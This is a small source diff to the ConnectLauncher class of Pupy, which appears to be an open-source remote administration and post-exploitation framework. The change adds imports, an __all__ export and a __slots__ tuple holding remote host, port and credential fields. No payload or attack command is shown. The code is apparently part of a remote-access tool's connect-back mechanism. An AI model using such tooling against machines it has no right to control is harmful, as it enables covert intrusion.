@@ -2,12 +2,22 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+__all__ = [ 'ConnectLauncher' ]
+
+import network
+import argparse
+import logging
+
+from network.lib import utils
+
 from ..base_launcher import *
 
 class ConnectLauncher(BaseLauncher):
     """ simple launcher that uses TCP connect with a chosen transport """
 
     credentials = [ 'SSL_BIND_CERT' ]
+
+    __slots__ = ( 'credentials', 'arg_parser', 'args', 'rhost', 'rport', 'connect_on_bind_payload' )
 
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop("connect_on_bind_payload", False)
